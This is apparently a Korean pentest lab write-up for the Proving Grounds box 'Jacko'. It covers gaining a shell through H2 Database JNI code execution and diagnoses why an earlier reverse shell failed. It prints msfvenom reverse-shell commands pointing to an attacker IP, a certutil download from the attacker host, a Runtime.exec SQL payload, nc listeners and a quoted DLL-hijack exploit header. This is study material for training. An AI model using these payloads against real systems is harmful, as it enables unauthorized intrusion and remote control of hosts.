msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.45.215 LPORT=4444 -f exe -o reverse.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.215 LPORT=4444 -f exe -o reverse.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.215 LPORT=8082 -f exe -o reverse.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.215 LPORT=135 -f exe > rev.exe
```

— 출처: `~/.zsh_history` 1792~1794 · 1802행

마지막 줄만 `-o` 대신 `> rev.exe` 를 씀. 결과 파일은 같음 — 배너는 stderr 로 나가므로 리다이렉션에 섞이지 않음. 유일한 차이는 `-o` 를 줬을 때만 마지막에 `Saved as: <파일>` 이 붙는 것(직접 실행해 확인).

첫 줄부터 셋째 줄까지가 **같은 파일명을 덮어쓰는 재생성**임. 이 덮어쓰기가 이 박스에서 54분을 태운 원인이 됨(→ [[_PLAYBOOK#A-31. 리버스셸이 안 붙는다]]). meterpreter 를 버리고 소켓만 쓰는 `shell_reverse_tcp` 로 간 것은 옳은 선택임 — **OSCP 에서 meterpreter 는 1대 한정**이고 이런 잡박스에 그 한 장을 태울 이유가 없음. `msfvenom` 과 `multi/handler` 자체는 전 대상 허용.

최종적으로 통한 것은 8082 판. 원본 노트가 남긴 실행 원문:

```bash
┌──(kali㉿kali)-[~/PG/Jacko]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.215 LPORT=8082 -f exe -o reverse.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7680 bytes
Saved as: reverse.exe
```

**전송 — HTTP + certutil.** Kali 쪽에서 `~/PG/Jacko` 를 그대로 서빙함.

![[Pasted image 20260710161044.png]]
```bash
┌──(kali㉿kali)-[~/PG/Jacko]
└─$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.120.66 - - [10/Jul/2026 16:10:29] "GET /reverse.exe HTTP/1.1" 200 -
192.168.120.66 - - [10/Jul/2026 16:10:29] "GET /reverse.exe HTTP/1.1" 200 -
```
— 출처: `파일보관/Pasted image 20260710161044.png`(16:10:44 붙여넣기, 화면 안 로그 시각 16:10:29)

같은 초에 GET 이 두 번 찍힘. **certutil 의 정상 동작임** — `certutil -urlcache -split -f` 한 번이 GET 두 번을 냄. Kali 에 `python3 -m http.server` 를 띄우고 Windows 에서 같은 명령을 치면 매 호출마다 같은 초에 두 줄이 찍힘(파일 크기 1KB·7.7KB·238KB·5MB 로 8회 시도, 전부 재현. Windows 11 26200 기준이고 타겟의 Windows 10 1909 에서 재확인하지는 않음 `[가정]`). 즉 16:10:29 의 두 줄은 다운로드 두 번이 아니라 한 번이고, 실패나 재시도의 흔적으로 읽으면 안 됨.

이 화면이 고정해주는 것은 따로 있음. **16:10:29 시점에 타겟이 이미 Kali 에서 파일을 가져감** — 뒤의 certutil 화면(16:29)보다 19분 이름. 즉 3단계 체인은 16:10 이전에 이미 한 번 돌아갔고 뒤의 화면들은 두 번째 시도임. **코드 실행이 성립한 시각의 하한이 여기서 정해짐.**

`sudo` 없이 80 번에 붙은 것이 의아하면 — 이 Kali 는 특권 포트 하한이 풀려 있음:

```bash
┌──(kali㉿kali)-[~]
└─$ sysctl net.ipv4.ip_unprivileged_port_start
net.ipv4.ip_unprivileged_port_start = 0
```

— 출처: Kali `sysctl` 실행 결과(2026-08-26 재확인, 동일 값)

기본값(1024)인 머신에서는 `sudo` 가 필요함. 배포판마다 다르니 안 뜨면 여기부터 볼 것.

타겟 쪽 다운로드는 위 프리미티브를 통해 실행함. `CSVWRITE` 로 DLL 투하:

![[Pasted image 20260710162803.png]]

`System_load` 로 로드:

![[Pasted image 20260710162836.png]]

응답이 `null` 인 것이 정상임 — `System.load` 는 반환값이 없음. **「null 이니까 실패했다」로 판단하면 안 됨.** 예외가 안 난 것이 성공 신호임.

그리고 certutil:

![[Pasted image 20260710162931.png]]
```sql
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil -urlcache -split -f http://192.168.45.215/reverse.exe C:/Windows/Temp/reverse.exe").getInputStream()).useDelimiter("\\Z").next()');
```
반환된 문자열(`(1 row, 1188 ms)` — certutil 이 1.2초 만에 끝남):
```text
**** Online ****
  000000  ...
  03a200
CertUtil: -URLCache command completed successfully.
```
— 출처: `파일보관/Pasted image 20260710162931.png`(16:29:31). `...` 은 certutil 자신이 찍은 진행 표시이고 생략한 것이 아님.

`getInputStream()` 으로 stdout 을 받아온 덕에 **certutil 의 성공 여부를 그 자리에서 확인**할 수 있었음. 블라인드로 던지고 결과를 모르는 것과 다름.

**플래그 해설** — 통설이 틀린 곳이라 직접 때려보고 적음. Kali 에 `http.server` 를 띄우고 Windows 11 26200 에서 각 조합을 실행해 확인.

| 플래그 | 실제 역할 | 빼면 |
|---|---|---|
| `-urlcache` | URL 캐시 하위명령 진입 | 다운로드 기능 자체가 없음 |
| `-f` | 네트워크에서 새로 받아오도록 강제하고 캐시를 갱신 | `**** OFFLINE ****` 를 찍고 **캐시에서만** 꺼냄. 같은 URL 을 이미 받아둔 상태였다면 파일은 정상 크기로 떨어지고 종료코드도 0 임 — **성공처럼 보이는데 옛 파일** |
| `-split` | 문서상 역할은 「포함된 ASN.1 요소를 분리해 파일로 저장」(`certutil -urlcache -?`) | **파일은 그대로 떨어짐.** 대신 진행 오프셋 두 줄(`000000 ...` / `03a200`)이 **안 찍힘** |

⚠️ LOLBin 치트시트가 대개 「`-split` 이 파일을 떨어뜨린다」고 적어놨으나 **틀림** — `certutil -urlcache -f <URL> out.bin` 만으로도 `out.bin` 이 원본과 동일하게 생성됨(240,000바이트 파일로 확인). 다만 **이 박스에서는 `-split` 이 결정적이었음** — 위 화면의 `03a200` 이 곧 받은 파일 크기이고, 그 한 줄이 「엉뚱한 파일을 서빙 중」을 드러낸 유일한 단서였음. `-split` 없이 돌렸다면 그 줄이 없었음.

⚠️ **`-f` 를 빼면 「실패」가 아니라 「조용히 캐시본」이 나옴.** 직접 실행 결과 `-urlcache -split`(`-f` 없음)은 `**** OFFLINE ****` 를 찍으면서도 캐시에 있던 240,000바이트를 **온전히** 써냈고 종료코드 0 이었음. 리버스셸이 안 붙을 때 「certutil 은 성공했는데?」로 헤매는 경로가 여기임. **캐시가 비어 있을 때의 동작(0바이트/실패 여부)은 확인하지 못함 `[가정]`.**

— 위 표와 두 경고는 Windows 11 26200 에서 세 조합(`-split -f` / `-f` / `-split`)을 240,000바이트 파일에 대해 실행해 확인함. 타겟의 Windows 10 1909 에서 재확인하지는 않음 `[가정]`.

> [!danger] 이 화면에 이 박스에서 가장 비쌌던 실수가 찍혀 있다
> `03a200` 은 certutil 이 마지막으로 찍은 **바이트 오프셋**, 곧 받은 파일의 크기임. 0x03a200 = **238,080 바이트**. (이 읽는 법은 certutil 문서에서 확인한 것이 아니라 아래에서 그 값이 실제 msfvenom 산출물 크기와 **정확히 일치**하는 것으로 뒷받침됨.)
>
> 그런데 이 박스에서 최종적으로 통한 `reverse.exe` 는 **7,680 바이트**임. 크기가 31배 다름. 즉 16:29 에 타겟이 받아간 것은 나중에 셸을 준 그 파일이 **아님.**

남아 있는 두 exe 는 둘 다 7,680바이트이므로 238,080 은 그 둘이 아님. 히스토리의 첫 번째 msfvenom 줄을 그대로 다시 돌려 확인함:

```bash
┌──(kali㉿kali)-[~]
└─$ python3 -c "print(0x03a200)"
238080
```

```bash
┌──(kali㉿kali)-[/tmp]
└─$ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.45.215 LPORT=4444 -f exe -o mtr.exe 2>&1 | tail -3
Payload size: 230982 bytes
Final size of exe file: 238080 bytes
Saved as: mtr.exe
```

**정확히 일치함.** 16:29 에 타겟이 받아간 `reverse.exe` 는 `windows/x64/meterpreter_reverse_tcp`, **LPORT=4444** 판이었음. 16:10 것도 같은 파일로 봄 — 그 사이 `~/PG/Jacko` 에서 일어난 쓰기가 하나도 없음(다음 쓰기는 16:46:50 의 `rev.exe`) `[가정]`.

그래서 붙을 수가 없었음. 두 겹으로 틀림:

- **포트가 다름.** 페이로드는 4444 로 콜백하는데 리스너는 135 와 8082 에 걸려 있었음
- **핸들러 종류가 다름.** `meterpreter_reverse_tcp` 는 붙자마자 메타스플로잇 프로토콜로 말함. 4444 에 `nc` 를 걸어놨더라도 **cmd 프롬프트는 안 나옴** — `multi/handler` + 같은 페이로드 조합이라야 함

원본 노트에 남아 있던 일반형 템플릿 한 줄(실행 기록이 아니라 메모임):

```text
"certutil -urlcache -split -f http://[Kali IP]/shell.exe C:/Windows/Temp/shell.exe"
```

최종적으로 실행된 경로는 `C:\Users\tony\Desktop\reverse.exe` 임. 원본 노트가 남긴 certutil 명령:

```text
"certutil -urlcache -split -f http://192.168.45.215/reverse.exe C:\\Users\\tony\\Desktop\\reverse.exe"
```

**두 certutil 의 목적지가 다름** — `C:\Windows\Temp` 와 `C:\Users\tony\Desktop`. 그리고 내용물도 달랐음. URL 은 둘 다 `http://192.168.45.215/reverse.exe` 로 같은데 그 사이에 Kali 쪽 `reverse.exe` 가 교체됐기 때문임. Desktop 쪽 certutil 이 실행된 화면은 남아 있지 않음.

**실행.**

![[Pasted image 20260710170436.png]]
```sql
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:\\Users\\tony\\Desktop\\reverse.exe").getInputStream()).useDelimiter("\\Z").next()');
```
— 출처: `파일보관/Pasted image 20260710170436.png`(17:04:36)

이 호출은 **응답이 돌아오지 않음.** `reverse.exe` 가 종료되지 않으니 `Scanner.next()` 가 끝나지 않고 콘솔은 계속 도는 상태로 남음. 셸이 붙었으면 그것이 정상임. 실제로 스크린샷에 찍힌 것은 앞의 `CREATE ALIAS` 결과(`갱신된 개수: 0`, `0 ms`)까지이고 `CALL` 결과는 없음.

```bash
┌──(kali㉿kali)-[~/PG/Jacko]
└─$ rlwrap nc -lnvp 8082
listening on [any] 8082 ...
connect to [192.168.45.215] from (UNKNOWN) [192.168.120.66] 50180
Microsoft Windows [Version 10.0.18363.836]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Program Files (x86)\H2\service>whoami
whoami
'whoami' is not recognized as an internal or external command,
operable program or batch file.
```

작업 디렉터리가 `C:\Program Files (x86)\H2\service` 임 — H2 가 Windows 서비스로 돌고 있고 이 셸은 그 서비스 프로세스의 자식임. 프롬프트가 나온 것 자체가 **대화형 셸**의 표식임(웹셸 아님).

> [!danger] `whoami` 가 없다
> 이 셸에서 `whoami` 가 실행되지 않음. `cmd.exe` 는 떴는데 `whoami.exe` 를 못 찾는다는 뜻임.
>
> 설명 — msfvenom 의 `shell_reverse_tcp` 는 `CreateProcess` 로 `cmd` 를 띄우는데 `CreateProcess` 의 실행파일 탐색은 **PATH 이전에 시스템 디렉터리(`C:\Windows\System32`)를 먼저 봄.** 반면 `cmd.exe` 가 사용자가 친 `whoami` 를 찾을 때는 **`%PATH%` 만** 씀. 서비스가 PATH 없이(혹은 System32 가 빠진 PATH 로) 기동되면 정확히 이 증상이 남 `[가정]` — 이 박스에서 `echo %PATH%` 를 실행한 기록은 없음.
>
> **대처는 절대경로임.** `C:\Windows\System32\whoami.exe`. `net`·`systeminfo`·`icacls`·`reg` 도 전부 절대경로로 부를 것. 여기서 「명령이 없는 박스」로 판단하고 열거를 포기하면 `Privilege Escalation` 절처럼 됨.

산출물에 남은 exe 두 개는 **둘 다 정확히 7,680바이트**라 육안으로 구분되지 않음. `xxd` 로 뜨면 차이가 세 군데뿐임:

```bash
┌──(kali㉿kali)-[~/PG/Jacko]
└─$ xxd rev.exe > /tmp/r1.hex; xxd reverse.exe > /tmp/r2.hex; diff /tmp/r1.hex /tmp/r2.hex
19c19
< 00000120: f4da 0000 0200 2081 0000 1000 0000 0000  ...... .........
---
> 00000120: fbd0 0000 0200 2081 0000 1000 0000 0000  ...... .........
40c40
< 00000270: 2e6d 7a79 6a00 0000 3002 0000 0050 0000  .mzyj...0....P..
---
> 00000270: 2e62 676f 6500 0000 3002 0000 0050 0000  .bgoe...0....P..
431c431
< 00001ae0: 0049 89e5 49bc 0200 0087 c0a8 2dd7 4154  .I..I.......-.AT
---
> 00001ae0: 0049 89e5 49bc 0200 1f92 c0a8 2dd7 4154  .I..I.......-.AT
```
— 출처: `~/PG/Jacko/rev.exe` · `reverse.exe`(2026-08-26 재실행으로 동일 출력 확인)

마지막 줄이 답임. `49bc` 뒤에 `sockaddr_in` 이 통째로 들어 있음:

| 바이트 | 뜻 | `rev.exe` | `reverse.exe` |
|---|---|---|---|
| `0200` | `AF_INET` | 동일 | 동일 |
| 다음 2바이트 | 포트(네트워크 바이트순) | `0087` = **135** | `1f92` = **8082** |
| 다음 4바이트 | IPv4 | `c0a82dd7` = 192.168.45.215 | 동일 |

앞의 두 차이(`f4da`↔`fbd0`, `.mzyj`↔`.bgoe`)는 페이로드와 무관하고 같은 명령을 두 번 돌려도 달라짐 — **md5 로 페이로드를 구분하려 들면 안 됨**(→ [[_PLAYBOOK#B-8. 페이로드·전송]]).

히스토리에 남은 리스너는 둘:

```text
rlwrap nc -lnvp 135
rlwrap nc -lnvp 8082
```
— 출처: `~/.zsh_history` 1803~1804행

이 박스 구간(히스토리 1792~1810행)에 **4444 리스너도 `multi/handler` 도 없음.** 히스토리 전체를 봐도 `exploit/multi/handler` 는 한 줄도 없고, `msfconsole` 은 211행에 한 번 나오나 이 박스와 1500행 넘게 떨어진 다른 날의 것임(`~/.msf4/history` 의 그 세션도 `ms17_010` 대상 `192.168.141.10` 이라 Jacko 가 아님). 가장 가까운 `nc -lnvp 4444` 도 한참 떨어진 다른 박스 구간의 것임. **meterpreter 페이로드를 만들기는 했으나 핸들러를 띄운 적이 없음.**

파일 mtime·스크린샷·히스토리를 맞추면 타임라인이 이렇게 정리됨:

| 시각 | 사건 | 근거 |
|---|---|---|
| ~16:10 이전 | `reverse.exe` = meterpreter/4444 (238,080B) | msfvenom 재현 + certutil 오프셋 |
| **16:10:29** | 타겟이 `/reverse.exe` 를 받아감(2회 = 1다운로드) | `http.server` 로그 스크린샷 |
| **16:29:31** | JNI 로 certutil → `C:\Windows\Temp\reverse.exe`, `03a200` | 스크린샷 |
| **16:46:50** | `rev.exe` = shell_reverse_tcp/**135** 생성 | 파일 mtime + sockaddr |
| ? | `rlwrap nc -lnvp 135` → 무응답 | 히스토리 |
| **17:01:44** | `reverse.exe` 를 shell_reverse_tcp/**8082** 로 덮어씀 | 파일 mtime + sockaddr |
| **17:04:36** | Desktop 판 실행 → 8082 에서 셸 | 스크린샷 + nc 출력 |

`rev.exe`(135)가 타겟에 전달되거나 실행된 흔적은 어디에도 없음.

⚠️ 히스토리에서 msfvenom 세 줄(4444 meterpreter → 4444 shell → 8082 shell)은 `mkdir Jacko`·`nnmap` **앞**에 놓여 있어 그대로 읽으면 15:37 이전이 됨. 그럴 수 없음 — 그랬다면 16:10 에 타겟이 받아간 것이 238KB 가 아니라 7,680바이트여야 함. **`~/.zsh_history` 는 시간순이 아님**(→ [[_PLAYBOOK#A-6. 판단·검증 (메타)]]). 시각을 고정하는 것은 파일 mtime 과 스크린샷이고, 가운데 4444 shell 판은 덮어써져 시각을 못 박을 근거가 없음 `[가정]`.

**플래그 회수.**

![[Pasted image 20260710170741.png]]

```text
 Directory of c:\Users

07/09/2026  11:38 PM    <DIR>          .
07/09/2026  11:38 PM    <DIR>          ..
08/03/2024  05:10 AM    <DIR>          Administrator
07/09/2026  11:38 PM    <DIR>          DefaultAppPool
04/22/2020  04:22 AM    <DIR>          Public
07/10/2026  12:48 AM    <DIR>          tony
               0 File(s)              0 bytes
               6 Dir(s)   6,698,889,216 bytes free

c:\Users>cd tony
cd tony

c:\Users\tony>cd desktop
cd desktop

c:\Users\tony\Desktop>type local.txt
type local.txt
dc9bb9f7d40681ebf2db1589d6ca40f0
```
— 출처: `파일보관/Pasted image 20260710170741.png`(17:07:41)

명령이 두 번씩 보이는 것은 `shell_reverse_tcp` 로 잡은 셸에서 늘 나오는 현상임 — `cmd.exe` 가 파이프로 물려 있어 자기 입력을 다시 에코함. **대화형 셸이라는 표식이기도 함.**

**Local.txt value:**
`dc9bb9f7d40681ebf2db1589d6ca40f0` — `C:\Users\tony\Desktop\local.txt`

> [!warning] 시험 증거 형식으로는 부족하다
> 이 화면에는 플래그만 있음. OSCP 제출용은 `whoami`·`hostname`·`ip a`(공격자 IP 포함)가 **한 화면에** 있어야 함. 이 박스에서는 `whoami` 가 PATH 에 없었으니 `C:\Windows\System32\whoami.exe` 로 찍었어야 함.

### Privilege Escalation – 없음 (열거 미실행 · 취약점 미특정)

**Vulnerability Explanation:** 해당 없음 — **권한상승 취약점을 특정하지 못함.** 셸을 잡은 뒤 열거를 실행한 기록이 없어 후보를 좁히는 단계에 도달하지 못함.

**Vulnerability Fix:** 해당 없음.

**Severity:** N/A — 미달성.

**Steps to reproduce the attack:** 해당 없음.

**셸에서 관측된 것은 셋뿐임:**

- 셸의 작업 디렉터리 `C:\Program Files (x86)\H2\service`
- `whoami` 실행 실패 → **어느 계정으로 돌고 있는지 끝내 확인하지 못함**
- `c:\Users` 목록 — `Administrator` · `DefaultAppPool` · `Public` · `tony`

권한에 대해 말할 수 있는 것도 둘뿐임. `local.txt` 를 **읽었고**, certutil 로 `C:\Users\tony\Desktop\reverse.exe` 를 **썼음.** 남의 프로필 디렉터리에 쓸 수 있었으니 H2 서비스는 `tony` 본인이거나 관리자급 — 둘 중 어느 쪽인지는 끝내 못 가름 `[가정]`.

⚠️ **아래는 「배제」가 아니라 「미실행」임.** `whoami /priv`·`systeminfo`·`net user`·`icacls`·서비스 목록 — **어느 것도 실행 기록이 없음.** 리버스셸 안에서 친 명령은 `~/.zsh_history` 에 남지 않으므로 「실행했는데 기록이 없다」일 가능성도 있으나, 마지막 스크린샷이 `local.txt` 를 읽은 17:07:41 이고 그 뒤 이 박스의 화면이 한 장도 없음. 열거 없이 세션이 끝난 쪽이 정황에 맞음 `[가정]`.

**셸을 잡았으면 여기서 쳤어야 할 것** — `Initial Access` 재현 절의 PATH 함정 때문에 전부 절대경로로:

```text
C:\Windows\System32\whoami.exe /all
C:\Windows\System32\systeminfo.exe
C:\Windows\System32\net.exe user
C:\Windows\System32\net.exe localgroup administrators
C:\Windows\System32\sc.exe query state= all
C:\Windows\System32\wbem\wmic.exe service get name,pathname,startmode
```

우선순위는 `whoami /all` 하나임. **`SeImpersonatePrivilege` 가 켜져 있는지 아닌지가 이 박스의 전부**였을 가능성이 큼 — 서비스 계정에서 나온 셸이면 통상 켜져 있음.

**다음 후보 경로** — ⚠️ 아래는 **이 박스에서 관측한 것이 아님.** 볼트 `02. Pentest Essentials.md` §Jacko 에 외부 워크스루(benheater.com) 요약이 들어 있고, 그 요약이 가리키는 경로를 확인 가능한 부분만 검증해 옮김.

정석 경로는 비표준 소프트웨어 하나임 — Fujitsu **PaperStream IP (TWAIN)**. Kali 의 exploitdb 에서 실물 확인:

```bash
┌──(kali㉿kali)-[~]
└─$ head -16 /usr/share/exploitdb/exploits/windows/local/49382.ps1
# Exploit Title: PaperStream IP (TWAIN) 1.42.0.5685 - Local Privilege Escalation
# Exploit Author: 1F98D
# Original Author: securifera
# Date: 12 May 2020
# Vendor Hompage: https://www.fujitsu.com/global/support/products/computing/peripheral/scanners/fi/software/fi6x30-fi6x40-ps-ip-twain32.html
# CVE: CVE-2018-16156
# Tested on: Windows 10 x64
# References:
# https://www.securifera.com/advisories/cve-2018-16156/
# https://github.com/securifera/CVE-2018-16156-Exploit

# A DLL hijack vulnerability exists in the FJTWSVIC service running as part of
# the Fujitsu PaperStream IP (TWAIN) software package. This exploit searches
# for a writable location, copies the specified DLL to that location and then
# triggers the DLL load by sending a message to FJTWSVIC over the FjtwMkic_Fjicube_32
# named pipe.
```

— 출처: `/usr/share/exploitdb/exploits/windows/local/49382.ps1`

`FJTWSVIC` 서비스가 SYSTEM 으로 돌면서 이름있는 파이프 `FjtwMkic_Fjicube_32` 로 온 메시지를 받아 DLL 을 로드함. 익스플로잇 본문의 기본 페이로드 경로는 `$PayloadFile = "C:\Windows\Temp\UninOldIS.dll"` 이고, 파일 상단 주석이 권하는 생성 명령은 **x64**:

```bash
msfvenom -p windows/x64/shell_reverse_tcp -f dll -o shell.dll LHOST=eth0 LPORT=4444
```

볼트 요약 쪽은 `-a x86` 으로 적혀 있음. 익스플로잇 자신의 주석과 어긋나므로 **x64 를 먼저 시도**하고 실패하면 바꾸는 편이 나음.

확인 절차는 결국 하나임 — 셸에서 `C:\Program Files (x86)` 과 `C:\Program Files` 를 나열해 **표준 Windows 에 없는 이름**을 찾는 것. H2 도 그렇게 발견됐어야 할 대상이었음.

두 번째 후보는 `SeImpersonatePrivilege` → Potato 계열임. `whoami /priv` 를 못 봤으니 성립 여부를 말할 수 없음.

### Post-Exploitation

**Proof.txt value:**
**없음.** `C:\Users\Administrator\Desktop\proof.txt` 를 시도한 기록조차 없음. 근거 셋:

- 셸을 잡은 17:04:36 이후 남은 스크린샷이 `local.txt` 를 읽은 17:07:41 한 장뿐이고 그 뒤 이 박스 화면이 0장
- `~/PG/Jacko/` 산출물 5개(`nmap.log`·`whatweb.txt`·`49384.txt`·`rev.exe`·`reverse.exe`)에 셸 이후 결과물이 하나도 없음
- 포털 플래그 슬롯은 2개(`local.txt`·`proof.txt`)인데 확보한 것은 `local.txt` 하나 = **1/2**

⚠️ 포털 **제출** 기준으로는 `0/2` 임(`_AUDIT\portal-진행도-실측-20260820.md`). 확보한 `local.txt` 를 제출하지 않았기 때문이고, 볼트 기준(확보)과 포털 기준(제출)의 차이지 모순이 아님. 플래그 값은 인스턴스마다 재생성되므로 위 값을 지금 제출할 수는 없음.

**남긴 흔적**

타겟(192.168.120.66) — 정리한 기록이 없음. 다음 리버트 전까지 아래가 남아 있다고 봐야 함.

- `C:\Windows\Temp\JNIScriptEngine.dll`
- `C:\Windows\Temp\reverse.exe` — **meterpreter/4444 판**(238,080B). 실행되지 않았을 개연성이 높으나 확인하지 않음 `[가정]`
- `C:\Users\tony\Desktop\reverse.exe` — `shell_reverse_tcp`/8082 판(7,680B). **이건 실행됨**
- H2 DB 안의 별칭 두 개 — `System_load` · `JNIScriptEngine_eval`
- `jdbc:h2:~/test` — 접속 시점에 생성됐다면 H2 서비스 계정 홈에 `test.mv.db` `[가정]`

Kali — `python -m http.server 80` · `rlwrap nc -lnvp 135` · `rlwrap nc -lnvp 8082` 를 띄웠음. 종료를 확인한 기록은 없음(현재는 남아 있지 않음). 산출물 `~/PG/Jacko/` 5개는 보존.

**시험 규정 점검** — 걸리는 곳이 없음. 쓴 도구는 `nmap`·`whatweb`·`feroxbuster`(전부 열거 전용) · `searchsploit`(검색) · `msfvenom`·`nc`(허용). 익스플로잇 본문은 손으로 붙여넣는 SQL 세 덩어리라 그 자체가 수동 절차임. `msfconsole`/`multi/handler` 는 이 박스 기록에 없고 `~/.msf4/loot` 도 비어 있음 — meterpreter 페이로드를 **만들기는 했으나 핸들러를 띄운 적이 없음**.

## 관련

- EDB **49384** — H2 Database 1.4.199 JNI Code Execution: <https://www.exploit-db.com/exploits/49384> (로컬 사본 `~/PG/Jacko/49384.txt`, CVE 없음)
- 원 연구 — Code White, *Exploiting H2 Database with native libraries and JNI*: <https://codewhitesec.blogspot.com/2019/08/exploit-h2-database-native-libraries-jni.html>
- EDB **49382** — PaperStream IP (TWAIN) 1.42.0.5685 LPE / **CVE-2018-16156**: <https://www.exploit-db.com/exploits/49382> (권한상승 후보 경로. **이 박스에서 시도하지 않음**)
- 볼트 내부 — `02. Pentest Essentials.md` §Jacko(외부 워크스루 요약)
- [[_PLAYBOOK#A-31. 리버스셸이 안 붙는다]] · [[_PLAYBOOK#B-8. 페이로드·전송]] · [[_PLAYBOOK#A-11. 자동 도구가 뱉은 값이 의심스럽다]] · [[_PLAYBOOK#A-16. 워드리스트 열거가 전부 공전한다]] · [[_PLAYBOOK#A-18. 배경 스캔이 도는데 같은 스캔을 손으로 또 돌렸다]] · [[_PLAYBOOK#A-1-11. searchsploit 결과 읽는 법 — 0건도, 히트도 근거가 아니다]]
- [[_PLAYBOOK#B-2-14. H2 Database Console — 콘솔 접속 = 코드 실행 (CSVWRITE + CREATE ALIAS + JNI)]] — 이 박스의 진입 경로 카드
- [[_PLAYBOOK#A-3-11. Windows 셸에서 `whoami` 가 not recognized — 명령이 없는 게 아니라 PATH 가 없다]] — 열거가 멈춘 자리
- [[_PLAYBOOK#B-88. msfvenom 산출물은 md5 로 구분되지 않는다 — `49bc` 뒤 sockaddr 을 봐라]] · [[_PLAYBOOK#A-64. 사후에 시간 서사를 복원하는 법 — mtime + 스크린샷 파일명]] — 잔존 exe 식별과 히스토리 순서 반증
- [[Flu]] — 같은 자리에 오래 멈춰 있던 박스. 공개 익스플로잇으로 foothold 만 잡고 `proof.txt` 를 못 얻은 채 1/2 였다가 **2026-08-20 재도전으로 2/2** 가 됨. 잠긴 지점(무응답을 실패로 오독)이 그쪽 노트에 있음. Jacko 가 지금 그 상태임
- [[Kevin]] · [[Slort]] · [[Access]] — msfvenom 페이로드를 쓴 다른 Windows 박스
- [[Squid]] — 셸을 잡았을 때 SYSTEM 이 **아니었던** 경우. `whoami` 한 줄이 갈림길인데 이 박스는 그 한 줄조차 못 침
- [[Hub]] · [[Levram]] · [[RubyDome]] · [[Squid]] · [[Twiggy]] · [[Kevin]] — 누적 패턴 **「버전 판정은 독립 근거 2개」**. 여기서는 nmap 지문의 `[90117-199]` + 콘솔 화면의 `1.4.199`
- [[Crane]] · [[RubyDome]] · [[Astronaut]] · [[Exghost]] · [[Hawat]] · [[Squid]] — 누적 패턴 **「응답이 성공을 뜻하지 않는다」**. 이 박스에서는 뒤집힌 형태 — `System_load` 의 응답 `null` 이 **성공**이었음
- [[_STATUS]] — PG 283개 전수 진행현황
